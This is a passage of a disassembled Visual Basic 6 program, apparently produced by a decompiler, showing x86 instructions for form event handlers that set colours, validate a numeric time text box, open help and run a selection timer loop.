008564BF: mov var_38, 00FF00FFh
008564C6: jmp 8564E1h
008564C8: mov var_38, 000000FFh
008564CF: jmp 8564E1h
008564D1: mov var_38, 00FFFFFFh
008564D8: jmp 8564E1h
008564DA: mov var_38, 0000FFFFh
008564E1: push 00000000h
008564E3: push 0000000Fh
008564E5: mov eax, [ebp+08h]
008564E8: mov eax, [eax]
008564EA: push [ebp+08h]
008564ED: call [eax+00000344h]
008564F3: push eax
008564F4: lea eax, var_48
008564F7: push eax
008564F8: call 00410A84h ; Set (object)
008564FD: push eax
008564FE: lea eax, var_60
00856501: push eax
00856502: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00856507: add esp, 00000010h
0085650A: push eax
0085650B: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00856510: mov var_000000B4, eax
00856516: lea ecx, var_48
00856519: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085651E: lea ecx, var_60
00856521: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00856526: mov eax, var_000000B4
0085652C: mov var_000000CC, eax
00856532: cmp var_000000CC, 00000007h
00856539: jnbe 85658Bh
0085653B: mov eax, var_000000CC
00856541: jmp [eax*4+008569BFh]
00856548: and var_18, 00000000h
0085654C: jmp 85658Bh
0085654E: mov var_18, 00FF0000h
00856555: jmp 85658Bh
00856557: mov var_18, 00FFFF00h
0085655E: jmp 85658Bh
00856560: mov var_18, 0000FF00h
00856567: jmp 85658Bh
00856569: mov var_18, 00FF00FFh
00856570: jmp 85658Bh
00856572: mov var_18, 000000FFh
00856579: jmp 85658Bh
0085657B: mov var_18, 00FFFFFFh
00856582: jmp 85658Bh
00856584: mov var_18, 0000FFFFh
0085658B: push 00000000h
0085658D: push 00000000h
0085658F: mov eax, [ebp+08h]
00856592: mov eax, [eax]
00856594: push [ebp+08h]
00856597: call [eax+00000348h]
0085659D: push eax
0085659E: lea eax, var_48
008565A1: push eax
008565A2: call 00410A84h ; Set (object)
008565A7: push eax
008565A8: lea eax, var_60
008565AB: push eax
008565AC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008565B1: add esp, 00000010h
008565B4: push eax
008565B5: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008565BA: dec eax
008565BB: neg eax
008565BD: sbb eax, eax
008565BF: inc eax
008565C0: neg eax
008565C2: mov var_00000088, ax
008565C9: lea ecx, var_48
008565CC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008565D1: lea ecx, var_60
008565D4: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008565D9: movsx eax, word ptr var_00000088
008565E0: test eax, eax
008565E2: jz 8565EBh
008565E4: or word ptr var_34, FFFFh
008565E9: jmp 8565F0h
008565EB: and word ptr var_34, 0000h
008565F0: cmp [008F270Ch], 00000000h
008565F7: jnz 856614h
008565F9: push 008F270Ch
008565FE: push 0041B338h
00856603: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00856608: mov var_000000D0, 008F270Ch
00856612: jmp 85661Eh
00856614: mov var_000000D0, 008F270Ch
0085661E: mov eax, var_000000D0
00856624: mov eax, [eax]
00856626: mov var_00000088, eax
0085662C: mov var_78, 80020004h
00856633: mov var_80, 0000000Ah
0085663A: mov var_68, 80020004h
00856641: mov var_70, 0000000Ah
00856648: push 00000010h
0085664A: pop eax
0085664B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856650: lea esi, var_80
00856653: mov edi, esp
00856655: movsd 
00856656: movsd 
00856657: movsd 
00856658: movsd 
00856659: push 00000010h
0085665B: pop eax
0085665C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856661: lea esi, var_70
00856664: mov edi, esp
00856666: movsd 
00856667: movsd 
00856668: movsd 
00856669: movsd 
0085666A: mov eax, var_00000088
00856670: mov eax, [eax]
00856672: push var_00000088
00856678: call [eax+000002B0h]
0085667E: fclex 
00856680: mov var_0000008C, eax
00856686: cmp var_0000008C, 00000000h
0085668D: jnl 8566B2h
0085668F: push 000002B0h
00856694: push 004448FCh
00856699: push var_00000088
0085669F: push var_0000008C
008566A5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008566AA: mov var_000000D4, eax
008566B0: jmp 8566B9h
008566B2: and var_000000D4, 00000000h
008566B9: mov eax, [ebp+08h]
008566BC: mov eax, [eax]
008566BE: push [ebp+08h]
008566C1: call [eax+0000031Ch]
008566C7: push eax
008566C8: lea eax, var_48
008566CB: push eax
008566CC: call 00410A84h ; Set (object)
008566D1: mov var_00000088, eax
008566D7: lea eax, var_3C
008566DA: push eax
008566DB: mov eax, var_00000088
008566E1: mov eax, [eax]
008566E3: push var_00000088
008566E9: call [eax+000000A0h]
008566EF: fclex 
008566F1: mov var_0000008C, eax
008566F7: cmp var_0000008C, 00000000h
008566FE: jnl 856723h
00856700: push 000000A0h
00856705: push 00440E08h
0085670A: push var_00000088
00856710: push var_0000008C
00856716: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085671B: mov var_000000D8, eax
00856721: jmp 85672Ah
00856723: and var_000000D8, 00000000h
0085672A: mov eax, [ebp+08h]
0085672D: mov eax, [eax]
0085672F: push [ebp+08h]
00856732: call [eax+00000320h]
00856738: push eax
00856739: lea eax, var_4C
0085673C: push eax
0085673D: call 00410A84h ; Set (object)
00856742: mov var_00000090, eax
00856748: lea eax, var_40
0085674B: push eax
0085674C: mov eax, var_00000090
00856752: mov eax, [eax]
00856754: push var_00000090
0085675A: call [eax+000000A0h]
00856760: fclex 
00856762: mov var_00000094, eax
00856768: cmp var_00000094, 00000000h
0085676F: jnl 856794h
00856771: push 000000A0h
00856776: push 00440E08h
0085677B: push var_00000090
00856781: push var_00000094
00856787: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085678C: mov var_000000DC, eax
00856792: jmp 85679Bh
00856794: and var_000000DC, 00000000h
0085679B: mov eax, [ebp+08h]
0085679E: mov eax, [eax]
008567A0: push [ebp+08h]
008567A3: call [eax+00000324h]
008567A9: push eax
008567AA: lea eax, var_50
008567AD: push eax
008567AE: call 00410A84h ; Set (object)
008567B3: mov var_00000098, eax
008567B9: lea eax, var_44
008567BC: push eax
008567BD: mov eax, var_00000098
008567C3: mov eax, [eax]
008567C5: push var_00000098
008567CB: call [eax+000000A0h]
008567D1: fclex 
008567D3: mov var_0000009C, eax
008567D9: cmp var_0000009C, 00000000h
008567E0: jnl 856805h
008567E2: push 000000A0h
008567E7: push 00440E08h
008567EC: push var_00000098
008567F2: push var_0000009C
008567F8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008567FD: mov var_000000E0, eax
00856803: jmp 85680Ch
00856805: and var_000000E0, 00000000h
0085680C: cmp [008F270Ch], 00000000h
00856813: jnz 856830h
00856815: push 008F270Ch
0085681A: push 0041B338h
0085681F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00856824: mov var_000000E4, 008F270Ch
0085682E: jmp 85683Ah
00856830: mov var_000000E4, 008F270Ch
0085683A: mov eax, var_000000E4
00856840: mov eax, [eax]
00856842: mov var_000000A0, eax
00856848: mov var_00000084, 0000000Ah
00856852: lea eax, var_34
00856855: push eax
00856856: lea eax, var_00000084
0085685C: push eax
0085685D: lea eax, var_2C
00856860: push eax
00856861: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00856866: push eax
00856867: push var_38
0085686A: push var_1C
0085686D: push var_30
00856870: push var_44
00856873: push var_40
00856876: push var_3C
00856879: mov eax, var_000000A0
0085687F: mov eax, [eax]
00856881: push var_000000A0
00856887: call [eax+000006F8h]
0085688D: fclex 
0085688F: mov var_000000A4, eax
00856895: cmp var_000000A4, 00000000h
0085689C: jnl 8568C1h
0085689E: push 000006F8h
008568A3: push 0044492Ch
008568A8: push var_000000A0
008568AE: push var_000000A4
008568B4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008568B9: mov var_000000E8, eax
008568BF: jmp 8568C8h
008568C1: and var_000000E8, 00000000h
008568C8: lea eax, var_44
008568CB: push eax
008568CC: lea eax, var_40
008568CF: push eax
008568D0: lea eax, var_3C
008568D3: push eax
008568D4: push 00000003h
008568D6: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008568DB: add esp, 00000010h
008568DE: lea eax, var_50
008568E1: push eax
008568E2: lea eax, var_4C
008568E5: push eax
008568E6: lea eax, var_48
008568E9: push eax
008568EA: push 00000003h
008568EC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008568F1: add esp, 00000010h
008568F4: mov var_04, 00000000h
008568FB: push 00856940h
00856900: jmp 856937h
00856902: lea eax, var_44
00856905: push eax
00856906: lea eax, var_40
00856909: push eax
0085690A: lea eax, var_3C
0085690D: push eax
0085690E: push 00000003h
00856910: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00856915: add esp, 00000010h
00856918: lea eax, var_50
0085691B: push eax
0085691C: lea eax, var_4C
0085691F: push eax
00856920: lea eax, var_48
00856923: push eax
00856924: push 00000003h
00856926: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085692B: add esp, 00000010h
0085692E: lea ecx, var_60
00856931: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00856936: ret 
End Sub

Private sub txtTimeSec__85817D
0085817D: push ebp
0085817E: mov ebp, esp
00858180: sub esp, 00000018h
00858183: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00858188: mov eax, fs:[00h]
0085818E: push eax
0085818F: mov fs:[00000000h], esp
00858196: mov eax, 00000088h
0085819B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008581A0: push ebx
008581A1: push esi
008581A2: push edi
008581A3: mov var_18, esp
008581A6: mov var_14, 0040C958h
008581AD: mov eax, [ebp+08h]
008581B0: and eax, 00000001h
008581B3: mov var_10, eax
008581B6: mov eax, [ebp+08h]
008581B9: and al, FEh
008581BB: mov [ebp+08h], eax
008581BE: mov var_0C, 00000000h
008581C5: mov eax, [ebp+08h]
008581C8: mov eax, [eax]
008581CA: push [ebp+08h]
008581CD: call [eax+04h]
008581D0: mov var_04, 00000001h
008581D7: mov var_04, 00000002h
008581DE: push FFFFFFFFh
008581E0: call 00410A60h ; On Error ...
008581E5: mov var_04, 00000003h
008581EC: mov eax, [ebp+08h]
008581EF: mov eax, [eax]
008581F1: push [ebp+08h]
008581F4: call [eax+00000300h]
008581FA: push eax
008581FB: lea eax, var_2C
008581FE: push eax
008581FF: call 00410A84h ; Set (object)
00858204: mov var_78, eax
00858207: lea eax, var_24
0085820A: push eax
0085820B: mov eax, var_78
0085820E: mov eax, [eax]
00858210: push var_78
00858213: call [eax+000000A0h]
00858219: fclex 
0085821B: mov var_7C, eax
0085821E: cmp var_7C, 00000000h
00858222: jnl 858241h
00858224: push 000000A0h
00858229: push 00440E08h
0085822E: push var_78
00858231: push var_7C
00858234: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00858239: mov var_000000A0, eax
0085823F: jmp 858248h
00858241: and var_000000A0, 00000000h
00858248: mov eax, [ebp+08h]
0085824B: mov eax, [eax]
0085824D: push [ebp+08h]
00858250: call [eax+00000300h]
00858256: mov var_3C, eax
00858259: mov var_44, 00000009h
00858260: push var_24
00858263: call 0041098Eh ; Len(arg_1)
00858268: xor ebx, ebx
0085826A: test eax, eax
0085826C: setnle bl
0085826F: neg ebx
00858271: lea eax, var_44
00858274: push eax
00858275: call 004109EEh ; IsNumeric(arg_1)
0085827A: neg ax
0085827D: sbb eax, eax
0085827F: inc eax
00858280: neg eax
00858282: and bx, ax
00858285: mov var_80, bx
00858289: lea ecx, var_24
0085828C: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00858291: lea ecx, var_2C
00858294: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00858299: lea ecx, var_44
0085829C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008582A1: movsx eax, word ptr var_80
008582A5: test eax, eax
008582A7: jz 00858420h
008582AD: mov var_04, 00000004h
008582B4: mov eax, [ebp+08h]
008582B7: mov eax, [eax]
008582B9: push [ebp+08h]
008582BC: call [eax+00000300h]
008582C2: push eax
008582C3: lea eax, var_34
008582C6: push eax
008582C7: call 00410A84h ; Set (object)
008582CC: mov eax, [ebp+08h]
008582CF: mov eax, [eax]
008582D1: push [ebp+08h]
008582D4: call [eax+00000300h]
008582DA: push eax
008582DB: lea eax, var_30
008582DE: push eax
008582DF: call 00410A84h ; Set (object)
008582E4: mov var_80, eax
008582E7: mov eax, [ebp+08h]
008582EA: mov eax, [eax]
008582EC: push [ebp+08h]
008582EF: call [eax+00000300h]
008582F5: push eax
008582F6: lea eax, var_2C
008582F9: push eax
008582FA: call 00410A84h ; Set (object)
008582FF: mov var_78, eax
00858302: lea eax, var_24
00858305: push eax
00858306: mov eax, var_78
00858309: mov eax, [eax]
0085830B: push var_78
0085830E: call [eax+000000A0h]
00858314: fclex 
00858316: mov var_7C, eax
00858319: cmp var_7C, 00000000h
0085831D: jnl 85833Ch
0085831F: push 000000A0h
00858324: push 00440E08h
00858329: push var_78
0085832C: push var_7C
0085832F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00858334: mov var_000000A4, eax
0085833A: jmp 858343h
0085833C: and var_000000A4, 00000000h
00858343: push var_24
00858346: call 0041098Eh ; Len(arg_1)
0085834B: sub eax, 00000001h
0085834E: jo 008584B8h
00858354: mov var_4C, eax
00858357: mov var_54, 00000003h
0085835E: mov eax, var_34
00858361: mov var_0000009C, eax
00858367: and var_34, 00000000h
0085836B: mov eax, var_0000009C
00858371: mov var_3C, eax
00858374: mov var_44, 00000009h
0085837B: lea eax, var_54
0085837E: push eax
0085837F: push 00000001h
00858381: lea eax, var_44
00858384: push eax
00858385: lea eax, var_64
00858388: push eax
00858389: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
0085838E: lea eax, var_64
00858391: push eax
00858392: lea eax, var_28
00858395: push eax
00858396: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
0085839B: push eax
0085839C: mov eax, var_80
0085839F: mov eax, [eax]
008583A1: push var_80
008583A4: call [eax+000000A4h]
008583AA: fclex 
008583AC: mov var_00000084, eax
008583B2: cmp var_00000084, 00000000h
008583B9: jnl 8583DBh
008583BB: push 000000A4h
008583C0: push 00440E08h
008583C5: push var_80
008583C8: push var_00000084
008583CE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008583D3: mov var_000000A8, eax
008583D9: jmp 8583E2h
008583DB: and var_000000A8, 00000000h
008583E2: lea eax, var_28
008583E5: push eax
008583E6: lea eax, var_24
008583E9: push eax
008583EA: push 00000002h
008583EC: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008583F1: add esp, 0000000Ch
008583F4: lea eax, var_34
008583F7: push eax
008583F8: lea eax, var_30
008583FB: push eax
008583FC: lea eax, var_2C
008583FF: push eax
00858400: push 00000003h
00858402: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00858407: add esp, 00000010h
0085840A: lea eax, var_64
0085840D: push eax
0085840E: lea eax, var_54
00858411: push eax
00858412: lea eax, var_44
00858415: push eax
00858416: push 00000003h
00858418: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0085841D: add esp, 00000010h
00858420: mov var_04, 00000006h
00858427: mov var_3C, 80020004h
0085842E: mov var_44, 0000000Ah
00858435: lea eax, var_44
00858438: push eax
00858439: push 0044AED4h ; {End}
0085843E: call 00410736h ; SendKeys
00858443: lea ecx, var_44
00858446: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0085844B: mov var_10, 00000000h
00858452: push 00858499h
00858457: jmp 858498h
00858459: lea eax, var_28
0085845C: push eax
0085845D: lea eax, var_24
00858460: push eax
00858461: push 00000002h
00858463: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00858468: add esp, 0000000Ch
0085846B: lea eax, var_34
0085846E: push eax
0085846F: lea eax, var_30
00858472: push eax
00858473: lea eax, var_2C
00858476: push eax
00858477: push 00000003h
00858479: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085847E: add esp, 00000010h
00858481: lea eax, var_64
00858484: push eax
00858485: lea eax, var_54
00858488: push eax
00858489: lea eax, var_44
0085848C: push eax
0085848D: push 00000003h
0085848F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00858494: add esp, 00000010h
00858497: ret 
End Sub

Private sub cmdHelp__856182
00856182: push ebp
00856183: mov ebp, esp
00856185: sub esp, 0000000Ch
00856188: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0085618D: mov eax, fs:[00h]
00856193: push eax
00856194: mov fs:[00000000h], esp
0085619B: push 00000038h
0085619D: pop eax
0085619E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008561A3: push ebx
008561A4: push esi
008561A5: push edi
008561A6: mov var_0C, esp
008561A9: mov var_08, 0040C8E0h
008561B0: mov eax, [ebp+08h]
008561B3: and eax, 00000001h
008561B6: mov var_04, eax
008561B9: mov eax, [ebp+08h]
008561BC: and al, FEh
008561BE: mov [ebp+08h], eax
008561C1: mov eax, [ebp+08h]
008561C4: mov eax, [eax]
008561C6: push [ebp+08h]
008561C9: call [eax+04h]
008561CC: cmp [008F26F8h], 00000000h
008561D3: jnz 8561EDh
008561D5: push 008F26F8h
008561DA: push 00411DD4h
008561DF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008561E4: mov var_48, 008F26F8h
008561EB: jmp 8561F4h
008561ED: mov var_48, 008F26F8h
008561F4: mov eax, var_48
008561F7: mov eax, [eax]
008561F9: mov var_38, eax
008561FC: mov var_2C, 80020004h
00856203: mov var_34, 0000000Ah
0085620A: mov var_1C, 80020004h
00856211: mov var_24, 0000000Ah
00856218: push 00000010h
0085621A: pop eax
0085621B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856220: lea esi, var_34
00856223: mov edi, esp
00856225: movsd 
00856226: movsd 
00856227: movsd 
00856228: movsd 
00856229: push 00000010h
0085622B: pop eax
0085622C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856231: lea esi, var_24
00856234: mov edi, esp
00856236: movsd 
00856237: movsd 
00856238: movsd 
00856239: movsd 
0085623A: mov eax, var_38
0085623D: mov eax, [eax]
0085623F: push var_38
00856242: call [eax+000002B0h]
00856248: fclex 
0085624A: mov var_3C, eax
0085624D: cmp var_3C, 00000000h
00856251: jnl 85626Dh
00856253: push 000002B0h
00856258: push 004448BCh
0085625D: push var_38
00856260: push var_3C
00856263: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00856268: mov var_4C, eax
0085626B: jmp 856271h
0085626D: and var_4C, 00000000h
00856271: mov var_04, 00000000h
00856278: mov eax, [ebp+08h]
0085627B: mov eax, [eax]
0085627D: push [ebp+08h]
00856280: call [eax+08h]
00856283: mov eax, var_04
00856286: mov ecx, var_14
00856289: mov fs:[00000000h], ecx
00856290: pop edi
00856291: pop esi
00856292: pop ebx
00856293: leave 
00856294: retn 0004h
End Sub

Private sub tmrSel__8577EA
008577EA: push ebp
008577EB: mov ebp, esp
008577ED: sub esp, 0000000Ch
008577F0: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008577F5: mov eax, fs:[00h]
008577FB: push eax
008577FC: mov fs:[00000000h], esp
00857803: mov eax, 000000F0h
00857808: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0085780D: push ebx
0085780E: push esi
0085780F: push edi
00857810: mov var_0C, esp
00857813: mov var_08, 0040C908h
0085781A: mov eax, [ebp+08h]
0085781D: and eax, 00000001h
00857820: mov var_04, eax
00857823: mov eax, [ebp+08h]
00857826: and al, FEh
00857828: mov [ebp+08h], eax
0085782B: mov eax, [ebp+08h]
0085782E: mov eax, [eax]
00857830: push [ebp+08h]
00857833: call [eax+04h]
00857836: cmp word ptr [008F2430h], FFFFh
0085783E: jnz 00857AB3h
00857844: mov var_70, 00000001h
0085784B: mov var_78, 00000002h
00857852: cmp [008F2010h], 00000000h
00857859: jnz 857876h
0085785B: push 008F2010h
00857860: push 00433984h
00857865: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0085786A: mov var_000000F4, 008F2010h
00857874: jmp 857880h
00857876: mov var_000000F4, 008F2010h
00857880: push 00000000h
00857882: push 00000001h
00857884: push 00440E48h
00857889: push 00000000h
0085788B: push 00000018h
0085788D: mov eax, var_000000F4
00857893: mov eax, [eax]
00857895: mov ecx, var_000000F4
0085789B: mov ecx, [ecx]
0085789D: mov ecx, [ecx]
0085789F: push eax
008578A0: call [ecx+0000054Ch]
008578A6: push eax
008578A7: lea eax, var_30
008578AA: push eax
008578AB: call 00410A84h ; Set (object)
008578B0: push eax
008578B1: lea eax, var_48
008578B4: push eax
008578B5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008578BA: add esp, 00000010h
008578BD: push eax
008578BE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008578C3: push eax
008578C4: lea eax, var_34
008578C7: push eax
008578C8: call 00410A84h ; Set (object)
008578CD: push eax
008578CE: lea eax, var_58
008578D1: push eax
008578D2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008578D7: add esp, 00000010h
008578DA: push eax
008578DB: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008578E0: mov var_80, eax
008578E3: mov var_00000088, 00000003h
008578ED: mov var_00000090, 00000001h
008578F7: mov var_00000098, 00000002h
00857901: lea eax, var_78
00857904: push eax
00857905: lea eax, var_00000088
0085790B: push eax
0085790C: lea eax, var_00000098
00857912: push eax
00857913: lea eax, var_000000C0
00857919: push eax
0085791A: lea eax, var_000000B0
00857920: push eax
00857921: lea eax, var_24
00857924: push eax
00857925: call 00410A3Ch ; For
0085792A: mov var_000000EC, eax
00857930: lea eax, var_34
00857933: push eax
00857934: lea eax, var_30
00857937: push eax
00857938: push 00000002h
0085793A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085793F: add esp, 0000000Ch
00857942: lea eax, var_58
00857945: push eax
00857946: lea eax, var_48
00857949: push eax
0085794A: push 00000002h
0085794C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00857951: add esp, 0000000Ch
00857954: jmp 00857AA1h
00857959: lea eax, var_24
0085795C: mov var_70, eax
0085795F: mov var_78, 0000400Ch
00857966: cmp [008F2010h], 00000000h
0085796D: jnz 85798Ah
0085796F: push 008F2010h
00857974: push 00433984h
00857979: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0085797E: mov var_000000F8, 008F2010h
00857988: jmp 857994h
0085798A: mov var_000000F8, 008F2010h
00857994: push 00000000h
00857996: push 00000004h
00857998: push 00440E58h
0085799D: push 00000010h
0085799F: pop eax
008579A0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008579A5: lea esi, var_78
008579A8: mov edi, esp
008579AA: movsd 
008579AB: movsd 
008579AC: movsd 
008579AD: movsd 
008579AE: push 00000001h
008579B0: push 00000000h
008579B2: push 00440E48h
008579B7: push 00000000h
008579B9: push 00000018h
008579BB: mov eax, var_000000F8
008579C1: mov eax, [eax]
008579C3: mov ecx, var_000000F8
008579C9: mov ecx, [ecx]
008579CB: mov ecx, [ecx]
008579CD: push eax
008579CE: call [ecx+0000054Ch]
008579D4: push eax
008579D5: lea eax, var_30
008579D8: push eax
008579D9: call 00410A84h ; Set (object)
008579DE: push eax
008579DF: lea eax, var_48
008579E2: push eax
008579E3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008579E8: add esp, 00000010h
008579EB: push eax
008579EC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008579F1: push eax
008579F2: lea eax, var_34
008579F5: push eax
008579F6: call 00410A84h ; Set (object)
008579FB: push eax
008579FC: lea eax, var_58
008579FF: push eax
00857A00: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00857A05: add esp, 00000020h
00857A08: push eax
00857A09: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00857A0E: push eax
00857A0F: lea eax, var_38
00857A12: push eax
00857A13: call 00410A84h ; Set (object)
00857A18: push eax
00857A19: lea eax, var_68
00857A1C: push eax
00857A1D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00857A22: add esp, 00000010h
00857A25: push eax
00857A26: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
00857A2B: sub ax, FFFFh
00857A2F: neg ax
00857A32: sbb eax, eax
00857A34: inc eax
00857A35: neg eax
00857A37: mov var_0000009C, ax
00857A3E: lea eax, var_38
00857A41: push eax
00857A42: lea eax, var_34
00857A45: push eax
00857A46: lea eax, var_30
00857A49: push eax
00857A4A: push 00000003h
00857A4C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00857A51: add esp, 00000010h
00857A54: lea eax, var_68
00857A57: push eax
00857A58: lea eax, var_58
00857A5B: push eax
00857A5C: lea eax, var_48
00857A5F: push eax
00857A60: push 00000003h
00857A62: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00857A67: add esp, 00000010h
00857A6A: movsx eax, word ptr var_0000009C
00857A71: test eax, eax
00857A73: jz 857A84h
00857A75: mov eax, var_28
00857A78: add eax, 00000001h
00857A7B: jo 00857E38h
00857A81: mov var_28, eax
00857A84: lea eax, var_000000C0
00857A8A: push eax
00857A8B: lea eax, var_000000B0
00857A91: push eax
00857A92: lea eax, var_24
00857A95: push eax
00857A96: call 00410A36h ; Next
00857A9B: mov var_000000EC, eax
00857AA1: cmp var_000000EC, 00000000h
00857AA8: jnz 00857959h
00857AAE: jmp 00857D1Dh
00857AB3: mov var_70, 00000001h
00857ABA: mov var_78, 00000002h
00857AC1: cmp [008F2010h], 00000000h
00857AC8: jnz 857AE5h
00857ACA: push 008F2010h
00857ACF: push 00433984h
00857AD4: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00857AD9: mov var_000000FC, 008F2010h
00857AE3: jmp 857AEFh
00857AE5: mov var_000000FC, 008F2010h
00857AEF: push 00000000h
00857AF1: push 00000001h
00857AF3: push 00440E48h
00857AF8: push 00000000h
00857AFA: push 00000018h
00857AFC: mov eax, var_000000FC
00857B02: mov eax, [eax]
00857B04: mov ecx, var_000000FC
00857B0A: mov ecx, [ecx]
00857B0C: mov ecx, [ecx]
00857B0E: push eax
00857B0F: call [ecx+00000550h]
00857B15: push eax
00857B16: lea eax, var_30
00857B19: push eax
00857B1A: call 00410A84h ; Set (object)
00857B1F: push eax
00857B20: lea eax, var_48
00857B23: push eax
00857B24: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00857B29: add esp, 00000010h
00857B2C: push eax
00857B2D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00857B32: push eax
00857B33: lea eax, var_34
00857B36: push eax
00857B37: call 00410A84h ; Set (object)
00857B3C: push eax
00857B3D: lea eax, var_58
00857B40: push eax
00857B41: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00857B46: add esp, 00000010h
00857B49: push eax
00857B4A: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00857B4F: mov var_80, eax
00857B52: mov var_00000088, 00000003h
00857B5C: mov var_00000090, 00000001h
00857B66: mov var_00000098, 00000002h
00857B70: lea eax, var_78
00857B73: push eax
00857B74: lea eax, var_00000088
00857B7A: push eax
00857B7B: lea eax, var_00000098
00857B81: push eax
00857B82: lea eax, var_000000E0
00857B88: push eax
00857B89: lea eax, var_000000D0
00857B8F: push eax
00857B90: lea eax, var_24
00857B93: push eax
00857B94: call 00410A3Ch ; For
00857B99: mov var_000000F0, eax
00857B9F: lea eax, var_34
00857BA2: push eax
00857BA3: lea eax, var_30
00857BA6: push eax
00857BA7: push 00000002h
00857BA9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00857BAE: add esp, 0000000Ch
00857BB1: lea eax, var_58
00857BB4: push eax
00857BB5: lea eax, var_48
00857BB8: push eax
00857BB9: push 00000002h
00857BBB: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00857BC0: add esp, 0000000Ch
00857BC3: jmp 00857D10h
00857BC8: lea eax, var_24
00857BCB: mov var_70, eax
00857BCE: mov var_78, 0000400Ch
00857BD5: cmp [008F2010h], 00000000h
00857BDC: jnz 857BF9h
00857BDE: push 008F2010h
00857BE3: push 00433984h
00857BE8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00857BED: mov var_00000100, 008F2010h
00857BF7: jmp 857C03h
00857BF9: mov var_00000100, 008F2010h
00857C03: push 00000000h
00857C05: push 00000004h
00857C07: push 00440E58h
00857C0C: push 00000010h
00857C0E: pop eax
00857C0F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857C14: lea esi, var_78
00857C17: mov edi, esp
00857C19: movsd 
00857C1A: movsd 
00857C1B: movsd 
00857C1C: movsd 
00857C1D: push 00000001h
00857C1F: push 00000000h
00857C21: push 00440E48h
00857C26: push 00000000h
00857C28: push 00000018h
00857C2A: mov eax, var_00000100
00857C30: mov eax, [eax]
00857C32: mov ecx, var_00000100
00857C38: mov ecx, [ecx]
00857C3A: mov ecx, [ecx]
00857C3C: push eax
00857C3D: call [ecx+00000550h]
00857C43: push eax
00857C44: lea eax, var_30
00857C47: push eax
00857C48: call 00410A84h ; Set (object)
00857C4D: push eax
00857C4E: lea eax, var_48
00857C51: push eax
00857C52: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00857C57: add esp, 00000010h
00857C5A: push eax
00857C5B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00857C60: push eax
00857C61: lea eax, var_34
00857C64: push eax
00857C65: call 00410A84h ; Set (object)
00857C6A: push eax
00857C6B: lea eax, var_58
00857C6E: push eax
00857C6F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
